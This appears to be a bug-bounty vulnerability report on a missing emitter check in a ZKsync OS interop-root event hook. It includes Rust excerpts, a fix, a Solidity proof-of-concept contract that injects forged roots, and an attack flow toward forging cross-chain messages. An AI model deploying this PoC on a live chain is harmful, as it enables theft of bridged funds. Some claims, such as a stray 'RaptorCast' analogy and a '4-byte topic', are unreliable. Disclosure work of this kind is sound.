### Title
Unauthenticated Emitter in `interop_root_reporter_event_hook` Allows Any Contract to Inject Arbitrary Interop Roots — (`system_hooks/src/event_hooks/interop_root_reporter.rs`)

---

### Summary

The `interop_root_reporter_event_hook` processes `InteropRootAdded` events to record cross-chain interop roots into the system state. It validates the event **signature topic** but never validates the **emitter's address**. Any unprivileged contract can emit a log with the `InteropRootAdded` selector and inject an arbitrary `(chain_id, block_or_batch_number, root)` tuple into the interop root storage. This is a direct analog of the RaptorCast missing identity validation: the "signature" (event topic) is checked, but the "identity" (emitter address) is not.

---

### Finding Description

**Root Cause**

`interop_root_reporter_event_hook` receives events from the EVM event dispatch pipeline. Its function signature is:

```rust
pub fn interop_root_reporter_event_hook<S: EthereumLikeTypes>(
    topics: &arrayvec::ArrayVec<..., MAX_EVENT_TOPICS>,
    data: &[u8],
    _caller_ee: u8,
    system: &mut System<S>,
    resources: &mut S::Resources,
) -> Result<(), SystemError>
``` [1](#0-0) 

The emitter address is **not a parameter** — it is structurally absent from the hook interface. The only guard inside the hook is a topic-0 signature check:

```rust
if topics.is_empty() || topics[0].as_u8_array() != INTEROP_ROOT_ADDED_EVENT_SIG {
    return Ok(());
}
``` [2](#0-1) 

After that check passes, the hook unconditionally parses `chain_id` and `block_or_batch_number` from topics[1]/topics[2] and `root` from the data field, then calls:

```rust
system.io.add_interop_root(
    ExecutionEnvironmentType::NoEE,
    resources,
    InteropRoot { root, block_or_batch_number, chain_id },
)?;
``` [3](#0-2) 

**Contrast with call hooks**, which all enforce a strict caller check. For example, the L1 messenger hook:

```rust
if caller != L1_MESSENGER_ADDRESS {
    // Pretend to be an empty account
    return Ok((...));
}
``` [4](#0-3) 

The event hook has no equivalent guard.

**Two-Stage Validation — Stage 2 Missing**

```
Stage 1: Event signature check ✅ IMPLEMENTED
  └─ topics[0] == INTEROP_ROOT_ADDED_EVENT_SIG

Stage 2: Emitter identity check ❌ MISSING
  └─ emitter == L2_INTEROP_ROOT_STORAGE_ADDRESS  ← never performed
```

---

### Impact Explanation

An attacker who can submit a transaction can deploy a contract that emits:

```solidity
emit InteropRootAdded(
    attacker_chain_id,
    attacker_block_number,
    [attacker_controlled_root]
);
```

The hook will process this as a legitimate interop root. Consequences:

1. **Fake root injection**: Attacker-controlled `(chain_id, block_number, root)` tuples are written into the interop root storage, which is the trust anchor for cross-chain message verification.
2. **Forged cross-chain messages**: If the injected root is used downstream to verify Merkle proofs of cross-chain messages, an attacker who controls the root can construct valid proofs for fabricated messages — enabling theft of bridged funds.
3. **DoS of legitimate interop**: Injecting conflicting roots for a real chain/block can cause legitimate cross-chain messages to fail verification.

This is a **state-transition bug** and a **public funds-loss path** within the Immunefi scope.

---

### Likelihood Explanation

- **No privilege required**: Any EOA can deploy a contract and call it in a standard L2 transaction.
- **No cost beyond gas**: The attack requires only a normal transaction fee.
- **Fully reachable**: The event hook is triggered by the EVM event dispatch for every emitted log; the attacker only needs to emit a log with the correct 4-byte topic.
- **No cryptographic assumption broken**: The attack exploits a missing authorization check, not a cryptographic weakness.

---

### Recommendation

Add an emitter address parameter to the event hook interface and enforce that only the authorized `L2_INTEROP_ROOT_STORAGE_ADDRESS` contract can trigger the root-recording path:

```rust
pub fn interop_root_reporter_event_hook<S: EthereumLikeTypes>(
    emitter: &B160,           // ← add emitter address
    topics: &arrayvec::ArrayVec<...>,
    data: &[u8],
    _caller_ee: u8,
    system: &mut System<S>,
    resources: &mut S::Resources,
) -> Result<(), SystemError> {
    // Guard: only the authorized interop root storage contract may emit this event
    if emitter != &L2_INTEROP_ROOT_STORAGE_ADDRESS {
        return Ok(());
    }
    if topics.is_empty() || topics[0].as_u8_array() != INTEROP_ROOT_ADDED_EVENT_SIG {
        return Ok(());
    }
    // ... rest of parsing
}
```

This mirrors the pattern already used by all call hooks (e.g., `l1_messenger_hook`, `mint_base_token_hook`, `set_bytecode_on_address_hook`).

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract FakeInteropRootEmitter {
    // InteropRootAdded(uint256,uint256,bytes32[])
    // keccak256 = 0x6b451b8422636e45b93bf7f594fa2c1769d039766c4254a6e7f9c0ee1715cdb0
    bytes32 constant SIG = 0x6b451b8422636e45b93bf7f594fa2c1769d039766c4254a6e7f9c0ee1715cdb0;

    function inject(
        uint256 chainId,
        uint256 blockNumber,
        bytes32 fakeRoot
    ) external {
        // Emit InteropRootAdded with attacker-controlled values
        // topics: [SIG, chainId, blockNumber]
        // data:   abi.encode(32, 1, fakeRoot)  (offset=32, len=1, root)
        assembly {
            let ptr := mload(0x40)
            mstore(ptr,        0x20)          // offset = 32
            mstore(add(ptr,32), 0x01)         // length = 1
            mstore(add(ptr,64), fakeRoot)     // root
            log3(ptr, 96, SIG, chainId, blockNumber)
        }
    }
}
```

**Attack flow:**
1. Attacker deploys `FakeInteropRootEmitter` on ZKsync OS L2.
2. Attacker calls `inject(victimChainId, victimBlockNumber, attackerRoot)`.
3. The EVM emits a log with `topics[0] == INTEROP_ROOT_ADDED_EVENT_SIG`.
4. `interop_root_reporter_event_hook` passes the topic check and calls `add_interop_root(...)` with attacker-controlled values.
5. The fake root is now stored as a trusted interop root for `victimChainId` at `victimBlockNumber`.
6. Attacker constructs a Merkle proof against `attackerRoot` for a fabricated cross-chain message and submits it for execution. [5](#0-4)

//! Interop root reporter system hook implementation.

use super::super::*;
use ruint::aliases::U256;
use zk_ee::types_config::SystemIOTypesConfig;
use zk_ee::{
    common_structs::interop_root_storage::InteropRoot,
    execution_environment_type::ExecutionEnvironmentType, internal_error,
    storage_types::MAX_EVENT_TOPICS, system::errors::system::SystemError, utils::Bytes32,
};

// InteropRootAdded(uint256,uint256,bytes32[]) - 6b451b8422636e45b93bf7f594fa2c1769d039766c4254a6e7f9c0ee1715cdb0
pub const INTEROP_ROOT_ADDED_EVENT_SIG: [u8; 32] = [
    0x6b, 0x45, 0x1b, 0x84, 0x22, 0x63, 0x6e, 0x45, 0xb9, 0x3b, 0xf7, 0xf5, 0x94, 0xfa, 0x2c, 0x17,
    0x69, 0xd0, 0x39, 0x76, 0x6c, 0x42, 0x54, 0xa6, 0xe7, 0xf9, 0xc0, 0xee, 0x17, 0x15, 0xcd, 0xb0,
];

pub fn interop_root_reporter_event_hook<S: EthereumLikeTypes>(
    topics: &arrayvec::ArrayVec<<S::IOTypes as SystemIOTypesConfig>::EventKey, MAX_EVENT_TOPICS>,
    data: &[u8],
    _caller_ee: u8,
    system: &mut System<S>,
    resources: &mut S::Resources,
) -> Result<(), SystemError>
where
{
    // First, ensure we're capturing the InteropRootAdded event
    if topics.is_empty() || topics[0].as_u8_array() != INTEROP_ROOT_ADDED_EVENT_SIG {
        return Ok(());
    }
    // Internal error if the data supplied doesn't match the expected value
    if data.len() != 96 {
        return Err(internal_error!("Interop root reporter event hook received bad data").into());
    }

    // Parse data
    let offset: u32 = match U256::from_be_slice(&data[..32]).try_into() {
        Ok(offset) => offset,
        Err(_) => {
            return Err(
                internal_error!("Interop root reporter event hook received bad offset").into(),
            );
        }
    };
    // This event is part of the system, but we check it anyways
    if offset != 32 {
        return Err(internal_error!("Interop root reporter event hook received bad offset").into());
    }

    let len: u32 = match U256::from_be_slice(&data[32..64]).try_into() {
        Ok(offset) => offset,
        Err(_) => {
            return Err(
                internal_error!("Interop root reporter event hook received bad length").into(),
            );
        }
    };
    // It should have exactly one side
    if len != 1 {
        return Err(internal_error!("Interop root reporter event hook received bad length").into());
    }
    // Validate topics length
    if topics.len() != 3 {
        return Err(internal_error!("Interop root reporter event hook received bad topics").into());
    }

    let root = Bytes32::from_array(data[64..96].try_into().unwrap());
    let chain_id = U256::from_be_bytes(topics[1].as_u8_array());
    let block_or_batch_number = U256::from_be_bytes(topics[2].as_u8_array());
    system.io.add_interop_root(
        ExecutionEnvironmentType::NoEE,
        resources,
        InteropRoot {
            root,
            block_or_batch_number,
            chain_id,
        },
    )?;

    Ok(())
}
